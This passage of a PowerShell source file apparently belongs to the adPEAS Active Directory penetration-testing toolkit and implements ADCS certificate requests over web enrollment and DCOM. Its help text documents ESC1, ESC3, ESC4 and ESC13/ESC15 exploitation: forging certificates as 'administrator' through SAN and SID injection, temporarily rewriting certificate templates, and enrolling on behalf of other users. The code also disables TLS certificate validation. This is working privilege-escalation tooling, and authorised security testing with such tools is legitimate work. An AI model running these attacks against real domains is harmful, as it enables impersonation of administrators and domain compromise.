        [string]$TemplateName,

        [PSCredential]$Credential,

        # The request payload is a PKCS#7 SignedData envelope (enroll-on-behalf-of)
        # rather than a bare PKCS#10 CSR.
        [switch]$IsPKCS7
    )

    $FunctionPrefix = "[Submit-COMRequest]"

    # CR_IN_BASE64 (0x1) | CR_IN_PKCS10 (0x100) | CR_IN_PKCS7 (0x300)
    $inputFlags = if ($IsPKCS7) { 0x301 } else { 0x101 }

    Write-Log "$FunctionPrefix Submitting via COM/RPC to config '$CAServer\$CAName' (template '$TemplateName', format=$(if ($IsPKCS7) { 'PKCS#7' } else { 'PKCS#10' }), auth=$(if ($Credential) { 'impersonated credential' } else { 'current context' }))"

    $result = @{
        Success      = $false
        RequestID    = $null
        Disposition  = $null
        Certificate  = $null   # X509Certificate2 on success (decoded from Base64)
        ErrorMessage = $null
    }

    $impersonationToken = [IntPtr]::Zero

    try {
        # Check if COM type is loaded
        if (-not ([System.Management.Automation.PSTypeName]'adPEAS.CertificateRequest').Type) {
            $result.ErrorMessage = "ICertRequest COM type not loaded - Add-Type failed during initialization"
            Write-Log "$FunctionPrefix $($result.ErrorMessage)" -Level Error
            return $result
        }

        # Apply alternate credentials via thread impersonation so the DCOM call to
        # the CA authenticates as the supplied user (netonly, NTLM).
        if ($Credential) {
            try {
                Write-Log "$FunctionPrefix Impersonating supplied credential for DCOM call"
                $impersonationToken = Invoke-NTLMImpersonation -Credential $Credential -Quiet
            }
            catch {
                $result.ErrorMessage = "Failed to impersonate credential for COM/RPC: $($_.Exception.Message)"
                Write-Log "$FunctionPrefix $($result.ErrorMessage)" -Level Error
                return $result
            }
        }

        # Call C# COM wrapper
        $comResult = [adPEAS.CertificateRequest]::SubmitRequest(
            $CAServer,
            $CAName,
            $CSRBase64,
            $TemplateName,
            $inputFlags
        )

        $result.RequestID = $comResult.RequestID
        $result.Disposition = $comResult.Disposition
        Write-Log "$FunctionPrefix CA returned disposition=$($comResult.Disposition), RequestID=$($comResult.RequestID)"

        if ($comResult.Success) {
            # Decode the Base64 certificate into an X509Certificate2 for a uniform
            # downstream contract with the HTTP path (Bug fix: previously the raw
            # Base64 string leaked into CopyWithPrivateKey/.Thumbprint).
            $decoded = ConvertTo-X509FromBase64 -Base64 $comResult.CertificateBase64
            if ($decoded) {
                $result.Success = $true
                $result.Certificate = $decoded
                Write-Log "$FunctionPrefix Certificate issued and decoded (RequestID: $($comResult.RequestID), Thumbprint: $($decoded.Thumbprint))"
            }
            else {
                $result.ErrorMessage = "CA issued the certificate but the returned data could not be decoded"
                Write-Log "$FunctionPrefix $($result.ErrorMessage)" -Level Warning
            }
        }
        else {
            $result.ErrorMessage = $comResult.ErrorMessage
            Write-Log "$FunctionPrefix Request failed: $($comResult.ErrorMessage)" -Level Warning
        }
    }
    catch {
        $result.ErrorMessage = "COM invocation failed: $($_.Exception.Message)"
        Write-Log "$FunctionPrefix $($result.ErrorMessage)" -Level Error
    }
    finally {
        if ($impersonationToken -ne [IntPtr]::Zero) {
            try {
                Invoke-RevertToSelf -TokenHandle $impersonationToken
                Write-Log "$FunctionPrefix Reverted impersonation token"
            }
            catch {
                Write-Log "$FunctionPrefix Failed to revert impersonation: $_" -Level Warning
            }
        }
    }

    return $result
}

#endregion

#region ===== CERTSRV HTTP COMMUNICATION =====

<#
.SYNOPSIS
    Submits a PKCS#10 CSR to a certsrv web enrollment endpoint.
#>
function Submit-CertsrvRequest {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$CAServer,

        [Parameter(Mandatory)]
        [string]$CSRBase64,

        [Parameter(Mandatory)]
        [string]$TemplateName,

        [PSCredential]$Credential,

        [switch]$UseHTTP,

        [int]$Port = 0,

        [int]$TimeoutSeconds = 30
    )

    $FunctionPrefix = "[Submit-CertsrvRequest]"
    $protocol = if ($UseHTTP) { "http" } else { "https" }
    $portPart = if ($Port -gt 0) { ":$Port" } else { "" }
    $submitUrl = "${protocol}://${CAServer}${portPart}/certsrv/certfnsh.asp"

    Write-Log "$FunctionPrefix Submitting CSR to $submitUrl"

    # Build form data
    $encodedCSR = [System.Uri]::EscapeDataString($CSRBase64)
    $formBody = "Mode=newreq&CertRequest=$encodedCSR&CertAttrib=CertificateTemplate%3A$TemplateName&SaveCert=yes&ThumbPrint="

    # Save and configure TLS settings
    $originalSecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol
    $originalCertCallback = [System.Net.ServicePointManager]::ServerCertificateValidationCallback

    $result = @{
        Success      = $false
        RequestID    = $null
        Status       = $null
        ErrorMessage = $null
        RawResponse  = $null
    }

    try {
        # Enable all TLS versions
        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls11 -bor [System.Net.SecurityProtocolType]::Tls
        try { [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor [System.Net.SecurityProtocolType]::Tls13 } catch { }
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }

        $request = [System.Net.HttpWebRequest]::Create($submitUrl)
        $request.Method = 'POST'
        $request.ContentType = 'application/x-www-form-urlencoded'
        $request.Timeout = $TimeoutSeconds * 1000
        $request.ReadWriteTimeout = $TimeoutSeconds * 1000
        $request.UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        $request.AllowAutoRedirect = $true
        $request.MaximumAutomaticRedirections = 5
        $request.CookieContainer = New-Object System.Net.CookieContainer

        # Authentication
        if ($Credential) {
            $netCred = $Credential.GetNetworkCredential()
            $credCache = New-Object System.Net.CredentialCache
            $uri = New-Object System.Uri($submitUrl)
            $credCache.Add($uri, 'Negotiate', $netCred)
            $credCache.Add($uri, 'NTLM', $netCred)
            $request.Credentials = $credCache
        }
        else {
            $request.UseDefaultCredentials = $true
        }

        # Write request body
        $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($formBody)
        $request.ContentLength = $bodyBytes.Length

        $requestStream = $null
        try {
            $requestStream = $request.GetRequestStream()
            $requestStream.Write($bodyBytes, 0, $bodyBytes.Length)
        }
        finally {
            if ($requestStream) {
                try { $requestStream.Close() } catch { }
                try { $requestStream.Dispose() } catch { }
            }
        }

        # Execute request
        $response = $null
        $responseContent = $null
        try {
            $response = $request.GetResponse()
            $responseStream = $response.GetResponseStream()
            $reader = New-Object System.IO.StreamReader($responseStream)
            $responseContent = $reader.ReadToEnd()
            $reader.Dispose()
            $responseStream.Dispose()
        }
        catch [System.Net.WebException] {
            $webEx = $_.Exception
            if ($webEx.Response) {
                $statusCode = [int]$webEx.Response.StatusCode
                try {
                    $errStream = $webEx.Response.GetResponseStream()
                    $errReader = New-Object System.IO.StreamReader($errStream)
                    $responseContent = $errReader.ReadToEnd()
                    $errReader.Dispose()
                    $errStream.Dispose()
                }
                catch { }
                finally {
                    try { $webEx.Response.Close() } catch { }
                    try { $webEx.Response.Dispose() } catch { }
                }

                if ($statusCode -eq 401) {
                    $result.ErrorMessage = "HTTP 401 Unauthorized. Try using -Credential parameter or check if the CA requires specific authentication."
                    $result.Status = 'AuthError'
                    return $result
                }
                elseif ($statusCode -eq 403) {
                    $result.ErrorMessage = "HTTP 403 Forbidden. Insufficient permissions for certificate enrollment."
                    $result.Status = 'AuthError'
                    return $result
                }
                else {
                    $result.ErrorMessage = "HTTP $statusCode error from CA server"
                    $result.Status = 'Error'
                    return $result
                }
            }
            else {
                $result.ErrorMessage = "Connection failed: $($webEx.Message)"
                $result.Status = 'Error'
                return $result
            }
        }
        finally {
            if ($response) {
                try { $response.Close() } catch { }
                try { $response.Dispose() } catch { }
            }
        }

        $result.RawResponse = $responseContent

        # Parse response HTML
        if (-not $responseContent) {
            $result.ErrorMessage = "Empty response from CA server"
            $result.Status = 'Error'
            return $result
        }

        # Check for issued certificate (link to download)
        if ($responseContent -match 'certnew\.cer\?ReqID=(\d+)') {
            $result.Success = $true
            $result.RequestID = [int]$Matches[1]
            $result.Status = 'Issued'
            Write-Log "$FunctionPrefix Certificate issued, Request ID: $($result.RequestID)"
        }
        # Check for pending approval
        elseif ($responseContent -match 'Certificate Pending' -or $responseContent -match 'Your certificate request was received') {
            if ($responseContent -match 'Your Request Id is (\d+)') {
                $result.RequestID = [int]$Matches[1]
            }
            elseif ($responseContent -match 'ReqID=(\d+)') {
                $result.RequestID = [int]$Matches[1]
            }
            $result.Success = $true
            $result.Status = 'Pending'
            Write-Log "$FunctionPrefix Certificate pending approval, Request ID: $($result.RequestID)"
        }
        # Check for denial
        elseif ($responseContent -match '(?i)denied|(?i)The disposition message is[^<]*?([^<\r\n]+)') {
            $result.Status = 'Denied'
            # Try to extract disposition message
            if ($responseContent -match 'The disposition message is[^"]*"([^"]+)"') {
                $result.ErrorMessage = "Certificate denied: $($Matches[1])"
            }
            elseif ($responseContent -match 'Disposition message:[^\S]*([^\r\n<]+)') {
                $result.ErrorMessage = "Certificate denied: $($Matches[1].Trim())"
            }
            else {
                $result.ErrorMessage = "Certificate request was denied by the CA"
            }
            Write-Log "$FunctionPrefix $($result.ErrorMessage)"
        }
        else {
            # Unknown response - try to extract any useful info
            $result.Status = 'Error'
            if ($responseContent -match '<title>([^<]+)</title>') {
                $result.ErrorMessage = "Unexpected response: $($Matches[1])"
            }
            else {
                $result.ErrorMessage = "Unexpected response from CA server (no certificate, pending, or denial pattern found)"
            }
            Write-Log "$FunctionPrefix $($result.ErrorMessage)"
        }
    }
    finally {
        # Restore original TLS settings
        [System.Net.ServicePointManager]::SecurityProtocol = $originalSecurityProtocol
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = $originalCertCallback
    }

    return $result
}

<#
.SYNOPSIS
    Retrieves an issued certificate from the certsrv endpoint.
#>
function Get-CertsrvCertificate {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$CAServer,

        [Parameter(Mandatory)]
        [int]$RequestID,

        [PSCredential]$Credential,

        [switch]$UseHTTP,

        [int]$Port = 0,

        [int]$TimeoutSeconds = 30
    )

    $FunctionPrefix = "[Get-CertsrvCertificate]"
    $protocol = if ($UseHTTP) { "http" } else { "https" }
    $portPart = if ($Port -gt 0) { ":$Port" } else { "" }
    $retrieveUrl = "${protocol}://${CAServer}${portPart}/certsrv/certnew.cer?ReqID=${RequestID}&Enc=b64"

    Write-Log "$FunctionPrefix Retrieving certificate from $retrieveUrl"

    # Save and configure TLS settings
    $originalSecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol
    $originalCertCallback = [System.Net.ServicePointManager]::ServerCertificateValidationCallback

    try {
        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls11 -bor [System.Net.SecurityProtocolType]::Tls
        try { [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor [System.Net.SecurityProtocolType]::Tls13 } catch { }
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }

        $request = [System.Net.HttpWebRequest]::Create($retrieveUrl)
        $request.Method = 'GET'
        $request.Timeout = $TimeoutSeconds * 1000
        $request.ReadWriteTimeout = $TimeoutSeconds * 1000
        $request.UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        $request.AllowAutoRedirect = $true

        # Authentication
        if ($Credential) {
            $netCred = $Credential.GetNetworkCredential()
            $credCache = New-Object System.Net.CredentialCache
            $uri = New-Object System.Uri($retrieveUrl)
            $credCache.Add($uri, 'Negotiate', $netCred)
            $credCache.Add($uri, 'NTLM', $netCred)
            $request.Credentials = $credCache
        }
        else {
            $request.UseDefaultCredentials = $true
        }

        $response = $null
        $responseContent = $null
        try {
            $response = $request.GetResponse()
            $responseStream = $response.GetResponseStream()
            $reader = New-Object System.IO.StreamReader($responseStream)
            $responseContent = $reader.ReadToEnd()
            $reader.Dispose()
            $responseStream.Dispose()
        }
        catch [System.Net.WebException] {
            $webEx = $_.Exception
            if ($webEx.Response) {
                try { $webEx.Response.Close() } catch { }
                try { $webEx.Response.Dispose() } catch { }
            }
            Write-Error "$FunctionPrefix Failed to retrieve certificate: $($webEx.Message)"
            return $null
        }
        finally {
            if ($response) {
                try { $response.Close() } catch { }
                try { $response.Dispose() } catch { }
            }
        }

        if (-not $responseContent) {
            Write-Error "$FunctionPrefix Empty response when retrieving certificate"
            return $null
        }

        # Decode the response (PEM, raw Base64, or PKCS#7) into the leaf certificate
        $cert = ConvertTo-X509FromBase64 -Base64 $responseContent
        if (-not $cert) {
            Write-Error "$FunctionPrefix Could not extract a certificate from the CA response"
            return $null
        }
        Write-Log "$FunctionPrefix Certificate retrieved: Subject=$($cert.Subject), Thumbprint=$($cert.Thumbprint)"
        return $cert
    }
    finally {
        [System.Net.ServicePointManager]::SecurityProtocol = $originalSecurityProtocol
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = $originalCertCallback
    }
}

#endregion

#region ===== PFX BUILD / PENDING KEY / RETRIEVE =====

<#
.SYNOPSIS
    Combines an issued certificate with its private key, writes the PFX, prints a
    summary, and returns a result object. Shared by the request and retrieve paths.
#>
function Save-IssuedCertificatePFX {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [System.Security.Cryptography.X509Certificates.X509Certificate2]$IssuedCert,

        [Parameter(Mandatory)]
        [System.Security.Cryptography.RSA]$RSA,

        [string]$OutputPath,
        [switch]$NoPassword,
        [string]$TemplateName,
        $RequestID,
        [string]$CAServer,
        [switch]$Force
    )

    $FunctionPrefix = "[Save-IssuedCertificatePFX]"

    # Determine PFX password
    if ($NoPassword) {
        $pfxPassword = $null
        Write-Log "$FunctionPrefix Exporting PFX without password (-NoPassword)"
    }
    else {
        $pfxPassword = New-SafePassword -Length 20
        Write-Log "$FunctionPrefix Generated random PFX password"
    }

    # Combine CA-issued cert with our private key
    try {
        $certWithKey = [System.Security.Cryptography.X509Certificates.RSACertificateExtensions]::CopyWithPrivateKey($IssuedCert, $RSA)
        if ($pfxPassword) {
            $securePfxPassword = ConvertTo-SecureString -String $pfxPassword -AsPlainText -Force
            $pfxBytes = $certWithKey.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx, $securePfxPassword)
        }
        else {
            $pfxBytes = $certWithKey.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx)
        }
        $certWithKey.Dispose()
        Write-Log "$FunctionPrefix Built PFX ($($pfxBytes.Length) bytes)"
    }
    catch {
        Write-Log "$FunctionPrefix CopyWithPrivateKey failed: $_"
        Write-Warning "[!] Failed to create PFX. .NET Framework 4.7.2+ is required."
        return $null
    }

    # Resolve output path
    if (-not $OutputPath) {
        # Extract CN from the ISSUED certificate (CA may override the requested subject)
        $cnForFile = if ($IssuedCert.Subject -match 'CN=([^,]+)') { $Matches[1].Trim() } else { 'certificate' }
        $pfxTimestamp = Get-Date -Format "yyyyMMdd_HHmmss"
        $OutputPath = "${cnForFile}_${pfxTimestamp}.pfx"
        Write-Log "$FunctionPrefix Derived output path: $OutputPath"
    }

    $exportResult = Export-adPEASFile -Path $OutputPath -Content $pfxBytes -Type Binary -SanitizeFilename -Force:$Force
    if (-not $exportResult.Success) {
        Write-Warning "[!] Failed to save PFX: $($exportResult.Message)"
        return $null
    }
    $OutputPath = $exportResult.Path

    # Display results
    Show-Line "Certificate saved as PFX:" -Class Hint
    Show-KeyValue "PFX Path:" $OutputPath
    if ($pfxPassword) {
        Show-KeyValue "PFX Password:" $pfxPassword
    } else {
        Show-KeyValue "PFX Password:" "(none)" -Class Note
    }
    Show-KeyValue "Thumbprint:" $IssuedCert.Thumbprint
    Show-KeyValue "Subject:" $IssuedCert.Subject
    Show-KeyValue "Issuer:" $IssuedCert.Issuer
    Show-KeyValue "Valid Until:" $IssuedCert.NotAfter.ToString("yyyy-MM-dd")
    if ($TemplateName) {
        Show-KeyValue "Template:" $TemplateName
    }

    # Show SANs from issued certificate
    $sanExt = $IssuedCert.Extensions | Where-Object { $_.Oid.Value -eq '2.5.29.17' }
    if ($sanExt) {
        Show-KeyValue "SAN:" $sanExt.Format($false)
    }
    # Show NTDS CA Security (SID) extension presence - confirms strong mapping
    $sidExt = $IssuedCert.Extensions | Where-Object { $_.Oid.Value -eq '1.3.6.1.4.1.311.25.2' }
    if ($sidExt) {
        Show-KeyValue "SID Extension:" "present (strong mapping enabled)"
    }

    Show-EmptyLine

    # Show usage hints
    $domainHint = if ($Script:LDAPContext -and $Script:LDAPContext['Domain']) { $Script:LDAPContext['Domain'] } else { '<domain>' }
    Show-Line "Usage with Connect-adPEAS:" -Class Note
    if ($pfxPassword) {
        Show-Line "Connect-adPEAS -Domain $domainHint -Certificate '$OutputPath' -CertificatePassword '$pfxPassword'"
    } else {
        Show-Line "Connect-adPEAS -Domain $domainHint -Certificate '$OutputPath'"
    }

    # Save certificate properties before disposing
    $certThumbprint = $IssuedCert.Thumbprint
    $certSubject = $IssuedCert.Subject
    $certIssuer = $IssuedCert.Issuer
    $IssuedCert.Dispose()

    return [PSCustomObject]@{
        Success     = $true
        Status      = 'Issued'
        RequestID   = $RequestID
        PFXPath     = $OutputPath
        PFXPassword = if ($pfxPassword) { $pfxPassword } else { $null }
        Thumbprint  = $certThumbprint
        Subject     = $certSubject
        Issuer      = $certIssuer
        Template    = $TemplateName
        CAServer    = $CAServer
    }
}

<#
.SYNOPSIS
    Serializes an RSA private key (plus request metadata) to a JSON sidecar so a
    pending certificate request can be completed later with -RetrieveID.
.NOTES
    The key is written in cleartext. Protect or delete the file after use.
#>
function Save-PendingPrivateKey {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [System.Security.Cryptography.RSA]$RSA,

        [Parameter(Mandatory)]
        $RequestID,

        [string]$Subject,
        [string]$CAServer,

        [Parameter(Mandatory)]
        [string]$OutputPath,

        [switch]$Force
    )

    $FunctionPrefix = "[Save-PendingPrivateKey]"
    $p = $RSA.ExportParameters($true)

    $obj = [PSCustomObject]@{
        Type      = 'adPEAS-PendingKey'
        Version   = 1
        RequestID = $RequestID
        Subject   = $Subject
        CAServer  = $CAServer
        Modulus   = [Convert]::ToBase64String($p.Modulus)
        Exponent  = [Convert]::ToBase64String($p.Exponent)
        D         = [Convert]::ToBase64String($p.D)
        P         = [Convert]::ToBase64String($p.P)
        Q         = [Convert]::ToBase64String($p.Q)
        DP        = [Convert]::ToBase64String($p.DP)
        DQ        = [Convert]::ToBase64String($p.DQ)
        InverseQ  = [Convert]::ToBase64String($p.InverseQ)
    }

    $json = $obj | ConvertTo-Json
    $exportResult = Export-adPEASFile -Path $OutputPath -Content $json -Type Text -SanitizeFilename -Force:$Force
    if (-not $exportResult.Success) {
        throw "Failed to write key file: $($exportResult.Message)"
    }
    Write-Log "$FunctionPrefix Saved pending private key to $($exportResult.Path)"
    return $exportResult.Path
}

<#
.SYNOPSIS
    Reconstructs an RSA private key from a JSON sidecar written by Save-PendingPrivateKey.
#>
function Restore-PendingPrivateKey {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$KeyFile
    )

    $FunctionPrefix = "[Restore-PendingPrivateKey]"

    if (-not (Test-Path -Path $KeyFile)) {
        throw "Key file not found: $KeyFile"
    }

    $j = Get-Content -Path $KeyFile -Raw | ConvertFrom-Json
    if ($j.Type -ne 'adPEAS-PendingKey') {
        throw "Unrecognized key file format: $KeyFile"
    }

    $p = New-Object System.Security.Cryptography.RSAParameters
    $p.Modulus  = [Convert]::FromBase64String($j.Modulus)
    $p.Exponent = [Convert]::FromBase64String($j.Exponent)
    $p.D        = [Convert]::FromBase64String($j.D)
    $p.P        = [Convert]::FromBase64String($j.P)
    $p.Q        = [Convert]::FromBase64String($j.Q)
    $p.DP       = [Convert]::FromBase64String($j.DP)
    $p.DQ       = [Convert]::FromBase64String($j.DQ)
    $p.InverseQ = [Convert]::FromBase64String($j.InverseQ)

    $rsa = [System.Security.Cryptography.RSA]::Create()
    $rsa.ImportParameters($p)

    Write-Log "$FunctionPrefix Restored private key from $KeyFile (RequestID=$($j.RequestID))"
    return [PSCustomObject]@{
        RSA       = $rsa
        RequestID = $j.RequestID
        Subject   = $j.Subject
        CAServer  = $j.CAServer
    }
}

<#
.SYNOPSIS
    Retrieves a previously submitted certificate request by ID and pairs it with the
    saved private key into a PFX. Backs the -RetrieveID mode of Request-ADCSCertificate.
#>
function Invoke-ADCSRetrieve {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [int]$RetrieveID,

        [string]$KeyFile,
        [string]$CAServer,
        [PSCredential]$Credential,
        [switch]$UseHTTP,
        [int]$Port = 0,
        [string]$OutputPath,
        [switch]$NoPassword,
        [switch]$PassThru,
        [switch]$Force
    )

    $FunctionPrefix = "[Invoke-ADCSRetrieve]"

    if ([string]::IsNullOrEmpty($CAServer)) {
        Write-Warning "[!] -RetrieveID requires -CAServer (the CA host that issued the request)."
        return $null
    }
    if ([string]::IsNullOrEmpty($KeyFile)) {
        Write-Warning "[!] -RetrieveID requires -KeyFile (the *.key.json saved when the request went pending)."
        return $null
    }

    # Restore the private key
    try {
        $restored = Restore-PendingPrivateKey -KeyFile $KeyFile
    }
    catch {
        Write-Warning "[!] $_"
        return $null
    }
    $rsa = $restored.RSA

    try {
        Show-Line "Retrieving certificate (Request ID: $RetrieveID) from CA '$CAServer'" -Class Note

        # Try HTTPS then HTTP unless -UseHTTP forces HTTP
        $httpModes = if ($UseHTTP) { @($true) } else { @($false, $true) }
        $issuedCert = $null
        foreach ($httpMode in $httpModes) {
            Write-Log "$FunctionPrefix Attempting retrieval (http=$httpMode)"
            $issuedCert = Get-CertsrvCertificate -CAServer $CAServer -RequestID $RetrieveID `
                -Credential $Credential -UseHTTP:$httpMode -Port $Port
            if ($issuedCert) { break }
        }

        if (-not $issuedCert) {
            Write-Warning "[!] Failed to retrieve certificate for Request ID $RetrieveID (not yet approved, denied, or wrong CA?)."
            return $null
        }

        $pfxResult = Save-IssuedCertificatePFX -IssuedCert $issuedCert -RSA $rsa `
            -OutputPath $OutputPath -NoPassword:$NoPassword `
            -RequestID $RetrieveID -CAServer $CAServer -Force:$Force
        if (-not $pfxResult) {
            return $null
        }
        if ($PassThru) {
            return $pfxResult
        }
    }
    finally {
        if ($rsa) { $rsa.Dispose() }
    }
}

#endregion

#region ===== MAIN FUNCTION =====

function Request-ADCSCertificate {
<#
.SYNOPSIS
    Requests a certificate from an ADCS Certificate Authority.

.DESCRIPTION
    Generates a PKCS#10 CSR, submits it to a Certificate Authority, and saves the issued certificate as a PFX file.

    Supports multiple submission methods with automatic fallback:
    1. HTTPS Web Enrollment (/certsrv/) - Primary method
    2. HTTP Web Enrollment (/certsrv/) - Fallback if HTTPS unavailable
    3. ICertRequest COM/RPC - Fallback if Web Enrollment unavailable/blocked

    Supports authentication via:
    - Current Windows context (DefaultCredentials) including PTT-injected Kerberos tickets
    - Explicit PSCredential for NTLM/Negotiate authentication

    The function can auto-discover CAs from Active Directory when connected via Connect-adPEAS, or target a specific CA server directly.

.PARAMETER CAServer
    FQDN of the CA server (e.g., "ca01.contoso.com").
    If not specified, auto-discovers from AD using Get-CertificateAuthority.

.PARAMETER CAName
    Logical CA name (e.g., "CONTOSO-CA01-CA"). Required for the COM/RPC method when
    using an explicit -CAServer; auto-filled from AD discovery otherwise.

.PARAMETER TemplateName
    Certificate template name (e.g., "User", "WebServer", "Machine").
    Required for a new request; omitted when using -RetrieveID.

.PARAMETER SID
    Object SID embedded in the NTDS CA Security Extension (1.3.6.1.4.1.311.25.2) for
    strong certificate mapping. Required for ESC1/ESC6 impersonation to authenticate
    against DCs with StrongCertificateBindingEnforcement (KB5014754, mandatory since
    Feb 2025). When omitted, the SID is auto-resolved via LDAP from the impersonated
    identity (UPN/DNS/Subject) if a session exists.

.PARAMETER NoSID
    Disable SID resolution/embedding entirely (e.g., for templates/CAs where the SID
    extension is undesired).

.PARAMETER Method
    Submission transport: Auto (default; Web first, COM/RPC fallback when Web
    Enrollment is absent), Web (certsrv only), or COM (ICertRequest DCOM only).

.PARAMETER Port
    Custom TCP port for the certsrv Web Enrollment endpoint. Default 0 uses the
    scheme default (80 for HTTP, 443 for HTTPS). Combine with -UseHTTP for plain
    HTTP on a non-standard port.

.PARAMETER RetrieveID
    Retrieve a previously submitted request by ID (after manager approval) and pair
    it with the saved private key (-KeyFile) into a PFX. Requires -CAServer and -KeyFile.

.PARAMETER KeyFile
    Path to the *.key.json sidecar written when a request went pending. Used with
    -RetrieveID to reconstruct the private key.

.PARAMETER OnBehalfOf
    ESC3 exploitation: request a certificate on behalf of this principal
    (format "DOMAIN\user"). Requires -PFX pointing to an enrollment-agent
    certificate that holds the Certificate Request Agent EKU (1.3.6.1.4.1.311.20.2.1).
    The inner CSR is wrapped in a PKCS#7 SignedData signed by the agent certificate.

.PARAMETER PFX
    Path or Base64 of the enrollment-agent PKCS#12/PFX (certificate + private key)
    used to sign an -OnBehalfOf request.

.PARAMETER PFXPassword
    Password protecting the -PFX enrollment-agent certificate.

.PARAMETER Impersonate
    Convenience parameter for ESC1/ESC4 exploitation. Accepts a username, UPN, or
    FQDN and automatically sets Subject and the appropriate SAN type.

    Accepted formats:
    - "administrator"              - Username only; domain appended, creates UPN SAN
    - "administrator@contoso.com"  - Full UPN; used as-is, creates UPN SAN
    - "srv-dc.contoso.com"         - FQDN; creates DNS SAN (for computer accounts)

    User example: -Impersonate "administrator" is equivalent to -Subject "CN=administrator" -UPN "administrator@contoso.com"
    Computer example: -Impersonate "srv-dc.contoso.com" is equivalent to -Subject "CN=srv-dc" -DNS "srv-dc.contoso.com"

.PARAMETER Subject
    Certificate subject name. The "CN=" prefix is added automatically if omitted.
    Default: current user from session.

    Accepted formats:
    - "Administrator"           - Becomes CN=Administrator
    - "CN=Administrator"        - Used as-is
    - "CN=Admin,O=Contoso"      - Full DN, used as-is

.PARAMETER UPN
    User Principal Name for Subject Alternative Name (e.g., "administrator@contoso.com").
    Added as otherName SAN with Microsoft UPN OID (1.3.6.1.4.1.311.20.2.3).

.PARAMETER DNS
    DNS hostname for Subject Alternative Name (e.g., "dc01.contoso.com").
    Added as dNSName SAN.

.PARAMETER AlternativeNames
    Raw Subject Alternative Names with type prefix. For advanced use cases.
    Supported formats: "UPN:user@domain.com", "DNS:host.domain.com", "URL:..."
    Prefer -UPN and -DNS parameters for simpler usage.

.PARAMETER ApplicationPolicies
    ESC13/ESC15 (EKUwu / CVE-2024-49019): inject Microsoft Application Policy OIDs
    into the request via the szOID_APPLICATION_CERT_POLICIES extension
    (1.3.6.1.4.1.311.21.10). On schema-v1 templates these are not sanitised, so EKUs
    the template does not list can be obtained. Accepts raw OIDs or friendly names:
    "Client Authentication", "Server Authentication", "Smart Card Logon",
    "Certificate Request Agent", "Code Signing", "PKINIT Client Authentication",
    "Secure Email", "Any Purpose".

.PARAMETER KeyLength
    RSA key length in bits. Default: 2048. Valid: 1024, 2048, 4096.

.PARAMETER OutputPath
    Path for the PFX file. Default: "<SubjectCN>_<timestamp>.pfx" in current directory.

.PARAMETER Credential
    PSCredential for HTTP authentication against the certsrv endpoint.
    If not specified, uses current Windows context (DefaultCredentials).

.PARAMETER Domain
    Target domain FQDN for CA auto-discovery. Uses session domain if not specified.

.PARAMETER Server
    Specific Domain Controller for LDAP queries during CA auto-discovery.

.PARAMETER ModifyTemplate
    ESC4 exploitation: temporarily modifies the certificate template to allow
    arbitrary subject names (ENROLLEE_SUPPLIES_SUBJECT), adds Client Authentication
    EKU, enables exportable private keys, and removes manager approval.

    The workflow:
    1. Backs up the original template configuration to a JSON file
    2. Modifies the template to be ESC1-exploitable
    3. Requests the certificate with the specified subject/SAN
    4. Restores the original template from backup

    Requires WriteDACL, WriteProperty, or GenericAll permissions on the template.
    The backup file is kept after successful restore for audit purposes.

.PARAMETER UseHTTP
    Use HTTP instead of HTTPS for certsrv requests. Less secure, but works
    when HTTPS is unavailable on the CA server.

.PARAMETER NoPassword
    Export the PFX file without password protection. This allows using the
    certificate directly with Get-CertificateInfo or Connect-adPEAS without
    specifying -CertificatePassword.

.PARAMETER PassThru
    Returns the result as a PSCustomObject to the pipeline instead of only
    displaying console output. Useful for scripting and automation.

.PARAMETER Force
    Overwrite existing PFX file without prompting.

.EXAMPLE
    Request-ADCSCertificate -TemplateName "User"
    Requests a certificate using the "User" template with auto-discovered CA.

.EXAMPLE
    Request-ADCSCertificate -CAServer "ca01.contoso.com" -TemplateName "User" -Credential (Get-Credential)
    Requests a certificate with explicit CA server and credentials.

.EXAMPLE
    Request-ADCSCertificate -TemplateName "VulnTemplate" -Impersonate "administrator"
    ESC1 exploitation: requests a certificate as Administrator. Domain suffix is auto-appended from session.

.EXAMPLE
    Request-ADCSCertificate -TemplateName "VulnTemplate" -Subject "Administrator" -UPN "administrator@contoso.com"
    ESC1 exploitation with explicit subject and UPN SAN.

.EXAMPLE
    Request-ADCSCertificate -TemplateName "WebServer" -ModifyTemplate -Impersonate "administrator"
    ESC4 exploitation: temporarily modifies the template, requests a cert as Administrator, then restores the original template.

.EXAMPLE
    Request-ADCSCertificate -TemplateName "WebServer" -Subject "dc01.contoso.com" -DNS "dc01.contoso.com"
    Requests a machine certificate with DNS SAN.

.EXAMPLE
    Request-ADCSCertificate -TemplateName "VulnTemplate" -UPN "administrator@contoso.com" -SID "S-1-5-21-1-2-3-500"
    ESC1 with an explicit SID embedded for strong mapping against patched DCs.

.EXAMPLE
    Request-ADCSCertificate -CAServer "ca01.contoso.com" -CAName "CONTOSO-CA01-CA" -TemplateName "User" -Method COM
    Forces the COM/RPC (ICertRequest DCOM) transport - useful when Web Enrollment (/certsrv/) is not installed.

.EXAMPLE
